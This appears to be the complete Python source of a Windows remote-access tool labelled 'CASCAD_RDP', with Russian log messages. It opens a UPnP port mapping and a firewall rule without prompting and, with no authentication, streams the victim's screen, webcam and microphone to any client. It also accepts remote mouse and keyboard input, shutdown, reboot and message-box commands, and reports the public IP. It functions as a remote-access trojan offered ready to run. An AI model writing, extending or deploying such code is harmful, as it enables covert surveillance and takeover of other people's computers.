import socket
import threading
import ctypes
import struct
import json
import io
import time
import cv2
import pyaudio
import pyautogui
from PIL import ImageGrab
import requests
import miniupnpc
import os
import subprocess

USE_RELAY = False
RELAY_HOST = "127.0.0.1"  
FALLBACK_PORT = 9999
RELAY_PORT = 5050

try:
    upnp = miniupnpc.UPnP()
    upnp.discoverdelay = 200
    upnp.discover()
    upnp.selectigd()
    external_ip = upnp.externalipaddress()
    port = 9999
    upnp.addportmapping(port, 'TCP', upnp.lanaddr, port, 'CASCAD_RDP', '')
    print(f"[UPnP] Порт {port} проброшен на {external_ip}")
except Exception as e:
    print(f"[UPnP] Не удалось пробросить порт: {e}")

os.system('netsh advfirewall firewall delete rule name="CASCAD_RDP" >nul 2>&1')
os.system('netsh advfirewall firewall add rule name="CASCAD_RDP" dir=in action=allow protocol=TCP localport=9999 >nul 2>&1')

ctypes.windll.user32.SetProcessDPIAware()
fps_control = {"fps": 60}

def show_messagebox(msg_type, title, message):
    MB_OK = 0x00000000
    MB_OKCANCEL = 0x00000001
    MB_YESNO = 0x00000004

    MB_ICONERROR = 0x00000010
    MB_ICONWARNING = 0x00000030
    MB_ICONQUESTION = 0x00000020
    MB_ICONINFORMATION = 0x00000040

    style = MB_OK
    if msg_type == 0: 
        style |= MB_ICONERROR
    elif msg_type == 1: 
        style |= MB_ICONWARNING
    elif msg_type == 2:  
        style = MB_YESNO | MB_ICONQUESTION
    else:  
        style |= MB_ICONINFORMATION

    return ctypes.windll.user32.MessageBoxW(0, message, title, style)

def send_screen(conn):
    try:
        while True:
            start = time.time()
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=50)
            data = buf.getvalue()
            size = len(data).to_bytes(4, 'big')
            conn.sendall(size + data)

            elapsed = time.time() - start
            delay = max(0.01, 1 / fps_control["fps"] - elapsed)
            time.sleep(delay)
    except:
        conn.close()

def receive_events(conn):
    try:
        while True:
            header = conn.recv(4)
            if not header:
                break
            length = struct.unpack(">I", header)[0]
            body = b""
            while len(body) < length:
                body += conn.recv(length - len(body))
            event = json.loads(body.decode('utf-8'))

            match event.get("type"):
                case "mousedown":
                    pyautogui.mouseDown(event["x"], event["y"], button=event["button"])
                case "mouseup":
                    pyautogui.mouseUp(event["x"], event["y"], button=event["button"])
                case "mousemove":
                    pyautogui.moveTo(event["x"], event["y"])
                case "double_click":
                    pyautogui.click(event["x"], event["y"], clicks=2)
                case "scroll":
                    pyautogui.scroll(event["amount"])
                case "keypress":
                    pyautogui.typewrite(event["key"])
                case "set_fps":
                    fps = int(event["value"])
                    fps_control["fps"] = fps
                case "shutdown":
                    subprocess.run("shutdown /s /t 0", shell=True)
                case "reboot":
                    subprocess.run("shutdown /r /t 0", shell=True)
                case "sleep":
                    subprocess.run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
                case "msgbox":
                    title = event.get("title", "Сообщение")
                    text = event.get("message", "")
                    msg_type = event.get("msg_type", 3)
                    show_messagebox(msg_type, title, text)
                case "get_ip_info":
                    try:
                       response = requests.get("http://ip-api.com/json/", timeout=5)
                       ipinfo = response.json()
                       msg = json.dumps(ipinfo).encode("utf-8")
                       length = struct.pack(">I", len(msg))
                       conn.sendall(length + msg)
                    except Exception as e:
                       error_msg = json.dumps({"error": str(e)}).encode("utf-8")
                       conn.sendall(struct.pack(">I", len(error_msg)) + error_msg)

    except Exception as e:
        print(f"[Ошибка]: {e}")
        conn.close()

def handle_client(conn):
    threading.Thread(target=send_screen, args=(conn,), daemon=True).start()
    threading.Thread(target=receive_events, args=(conn,), daemon=True).start()

def start_server():
    try:
        conn = socket.socket()
        conn.connect((RELAY_HOST, RELAY_PORT))
        print(f"[RELAY] Подключено к {RELAY_HOST}:{RELAY_PORT}")
        handle_client(conn)
        return
    except Exception as e:
        print(f"[RELAY] Не удалось подключиться: {e}")
        print("[FALLBACK] Запуск обычного TCP-сервера...")

    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("0.0.0.0", FALLBACK_PORT))
        server.listen(1)
        print(f"[+] Server listening on 0.0.0.0:{FALLBACK_PORT}")
        while True:
            conn, _ = server.accept()
            print("[+] Client connected")
            handle_client(conn)
    except Exception as e:
        print(f"[ERROR] Не удалось запустить TCP-сервер: {e}")

def ipinfo_server():
    s = socket.socket()
    s.bind(("0.0.0.0", 10000))
    s.listen(1)
    print("[IP] Сервер IP-инфо запущен")

    while True:
        conn, _ = s.accept()
        try:
            data = conn.recv(4)
            length = struct.unpack(">I", data)[0]
            request = conn.recv(length).decode("utf-8")
            req = json.loads(request)

            if req.get("type") == "get_ip_info":
                response = requests.get("http://ip-api.com/json/", timeout=5)
                ipinfo = response.json()
                msg = json.dumps(ipinfo).encode("utf-8")
                conn.sendall(struct.pack(">I", len(msg)) + msg)
        except Exception as e:
            print("[IP] Ошибка:", e)
        conn.close()

def webcam_server():
    s = socket.socket()
    s.bind(("0.0.0.0", 9998))
    s.listen(1)
    print("[Камера] Сервер запущен")

    while True:
        conn, _ = s.accept()
        print("[Камера] Клиент подключен")

        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        while cap.isOpened():
            ret, frame = cap.read()
            if not ret:
                break
            _, buffer = cv2.imencode('.jpg', frame)
            data = buffer.tobytes()
            try:
                conn.sendall(len(data).to_bytes(4, 'big') + data)
            except:
                break
            time.sleep(0.03)
        cap.release()
        conn.close()
        print("[Камера] Клиент отключен")

def microphone_server():
    s = socket.socket()
    s.bind(("0.0.0.0", 9996))
    s.listen(1)
    print("[Микрофон] Сервер запущен")

    while True:
        conn, _ = s.accept()
        print("[Микрофон] Клиент подключен")

        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)

        try:
            while True:
                data = stream.read(1024, exception_on_overflow=False)
                conn.sendall(data)
        except:
            print("[Микрофон] Клиент отключён")

        stream.stop_stream()
        stream.close()
        p.terminate()
        conn.close()

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    threading.Thread(target=webcam_server, daemon=True).start()
    threading.Thread(target=microphone_server, daemon=True).start()
    threading.Thread(target=ipinfo_server, daemon=True).start()
    while True:
        time.sleep(1)    
